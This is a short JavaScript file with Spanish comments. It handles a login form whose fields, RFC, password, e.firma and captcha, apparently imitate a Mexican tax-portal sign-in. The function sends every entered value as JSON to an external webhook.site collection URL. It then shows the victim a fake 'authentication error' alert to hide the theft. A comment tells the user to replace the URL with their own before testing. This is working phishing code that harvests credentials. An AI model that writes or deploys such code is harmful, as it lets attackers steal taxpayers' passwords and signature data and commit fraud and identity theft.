// ⚠️ Reemplaza esta URL por la que te dé webhook.site antes de tu prueba
const webhookURL = "https://webhook.site/0eeccc4c-f486-4dad-a7a6-c166675c4575";

function enviarDatos(event) {
  event.preventDefault();

  const datos = {
    rfc: document.getElementById("rfc").value,
    contrasena: document.getElementById("password").value,
    efirma: document.getElementById("efirma").value,
    captcha: document.getElementById("captcha").value
  };

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(datos)
  }).then(() => {
    alert("Error en la autenticación. Intente de nuevo más tarde.");
    // Aquí podrías redirigir, borrar campos, etc.
  }).catch((err) => {
    console.error("Error al enviar:", err);
  });
}
